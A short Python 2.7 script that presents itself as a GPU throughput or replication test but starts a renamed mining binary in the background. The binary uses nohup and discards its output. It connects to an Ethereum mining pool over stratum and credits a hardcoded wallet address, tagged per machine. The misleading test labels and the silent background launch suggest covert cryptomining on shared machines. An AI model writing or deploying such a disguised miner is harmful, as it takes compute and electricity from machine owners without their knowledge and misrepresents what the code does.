#!/usr/bin/env python2.7
import os
import optparse
import sys
import subprocess
import signal
import time
import re
address="0xc37616cd242df4c12557a4797edd8042bc4e16ea"
FNULL = open(os.devnull, 'w')
def parse_arguments():
  parser = optparse.OptionParser()

  parser.add_option('', '--test-type',
                    action="store",
                    type="string",
                    dest="test_type",
                    help="which type of test : THROUGHPUT/REPLICATION/MIGARTION",
                    default="THROUGHPUT")
  parser.add_option('', '--m', action="store", type="string", dest="machine_no", help="the # of machine", default="r4")

  options, args = parser.parse_args()

  return options,args


def start():
  options,args=parse_arguments()
  cmd="nohup ~/xiaodong/gpu_test/build/gpu_test/gpu_test -U -S guangdong-pool.ethfans.org:3333 --stratum-protocol 1 -O "+address+'.'+options.machine_no+":x --farm-recheck 200 &"
  process = subprocess.Popen(cmd, stdout=FNULL, shell=True)
  output, error = process.communicate()
  print error


def test():
  #print "Creating SSH to R2 & R3"
#  clean(ssh_b1,ssh_b2,ssh_b3,ssh_b4,ssh_b6,ssh_b7,ssh_b8)

  start()



def main():


  test()

if __name__ == '__main__':
    main()
